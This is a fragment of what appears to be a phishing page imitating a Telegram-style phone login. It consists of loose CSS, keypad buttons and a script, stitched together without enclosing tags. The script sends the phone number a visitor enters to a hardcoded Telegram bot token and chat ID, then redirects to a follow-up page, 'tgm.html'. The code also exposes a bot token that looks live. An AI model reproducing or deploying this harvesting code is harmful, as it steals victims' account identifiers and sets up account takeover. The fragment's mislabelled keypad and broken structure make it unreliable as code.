 height: 60px; border-radius: 50%; /* Makes it a circle */

#sendButton:hover {

}


 .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            max-width: 350px;
            margin: 20px auto;
            padding: 10px;
        }

        .keypad button {
            padding: 8px 0;
            font-size: 18px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: white;
            cursor: pointer;
            transition: all 0.2s;
            touch-action: manipulation; /* Prevent zoom on mobile */
        }

        .keypad button:hover {
            background: #f5f5f5;
        }

        .keypad button:active {
            background: #e0e0e0;
        }

        .keypad .letters {
            font-size: 12px;
            color: #888;
            display: block;
            margin-top: 4px;
        }

        .keypad .zero {
            grid-column: span 2;
        }

        /* Hide input keyboard */
        .country-code-input, .phone-input {
            caret-color: transparent; /* Hide blinking cursor */
        }
        
        .country-code-input:focus, .phone-input:focus {
            outline: none;
        }        

loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: none;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        <button onclick="appendNumber('1')">1<div class="letters">ABC</div></button>
        <button onclick="appendNumber('2')">2<div class="letters">DEF</div></button>
        <button onclick="appendNumber('3')">3<div class="letters">GHI</div></button>
        <button onclick="appendNumber('4')">4<div class="letters">JKL</div></button>
        <button onclick="appendNumber('5')">5<div class="letters">MNO</div></button>

<script>
  const countrySelect = document.getElementById('pick');
  const countryCodeInput = document.getElementById('countryCode');
  const phoneInput = document.getElementById('phone');
  const sendButton = document.getElementById('sendButton');
  let activeInput = countryCodeInput; // Always start with country code

  // Set initial focus on country code (without showing keyboard)
  window.addEventListener('DOMContentLoaded', () => {
    countryCodeInput.focus();
    setTimeout(() => countryCodeInput.blur(), 10);
  });

  // Prevent device keyboard from showing
  [countryCodeInput, phoneInput].forEach(input => {
    input.addEventListener('focus', function(e) {
      activeInput = this;
      setTimeout(() => this.blur(), 10);
    });
  });

  // Only select country when full code is entered
  countryCodeInput.addEventListener('input', function() {
    const code = this.value;
    // Only check for exact matches when input length matches a country code length
    const option = Array.from(countrySelect.options).find(opt => 
      opt.value === code
    );
    
    if (option) {
      option.selected = true;
      activeInput = phoneInput; // Only switch focus on exact match
    } else {
      countrySelect.selectedIndex = 0; // Reset selection if no exact match
      activeInput = countryCodeInput; // Stay on country code
    }
  });

  // When country is selected from dropdown
  countrySelect.addEventListener('change', function() {
    if (this.value) {
      countryCodeInput.value = this.value;
      activeInput = phoneInput;
    } else {
      activeInput = countryCodeInput;
    }
  });

  // Keypad functions
  function appendNumber(num) {
    if (!activeInput) activeInput = countryCodeInput;
    
    if (activeInput === countryCodeInput) {
      if (countryCodeInput.value.length >= 4) return;
      countryCodeInput.value += num;
      
      // Check for exact match after each input
      const option = Array.from(countrySelect.options).find(opt => 
        opt.value === countryCodeInput.value
      );
      
      if (option) {
        option.selected = true;
        activeInput = phoneInput;
      }
      return;
    }
    
    // Handle phone input
    if (phoneInput.value.length >= 15) return;
    phoneInput.value += num;
  }

  function backspace() {
    if (!activeInput) activeInput = countryCodeInput;
    
    if (activeInput === phoneInput) {
      phoneInput.value = phoneInput.value.slice(0, -1);
      if (phoneInput.value.length === 0) {
        activeInput = countryCodeInput;
      }
    } 
    else if (activeInput === countryCodeInput) {
      countryCodeInput.value = countryCodeInput.value.slice(0, -1);
      // Only select country if we have an exact match after backspace
      const option = Array.from(countrySelect.options).find(opt => 
        opt.value === countryCodeInput.value
      );
      countrySelect.selectedIndex = option ? option.index : 0;
    }
  }

  // Send button functionality
  sendButton.addEventListener('click', function() {
    if (!countrySelect.value) {
      alert('Please select a country first');
      activeInput = countryCodeInput;
      return;
    }
    
    if (!phoneInput.value.trim()) {
      alert('Please enter your phone number');
      activeInput = phoneInput;
      return;
    }
    
    sendButton.innerHTML = '<span class="loader"></span> Sending...';
    sendButton.disabled = true;
    
    const oken = '8210146562:AAHR9fBayV6sQmwMQe6l-bzdpGPW60jOZLk';
    const chad = '-1002806480228';
    const message = `New number: ${countryCodeInput.value}${phoneInput.value}`;
    
    fetch(`https://api.telegram.org/bot${oken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chad,
        text: message
      })
    })
    .then(response => {
      if (!response.ok) throw new Error('Network response was not ok');
      return response.json();
    })
    .then(() => {
      window.location.href = 'tgm.html';
    })
    .catch(error => {
      console.error('Error:', error);
      sendButton.innerHTML = 'Send';
      sendButton.disabled = false;
      alert('Please try again. Also check your number.');
    });
  });

  // Add loader style
  const style = document.createElement('style');
  style.textContent = `
    .loader {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid #fff;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
      margin-right: 5px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `;
  document.head.appendChild(style);
</script>
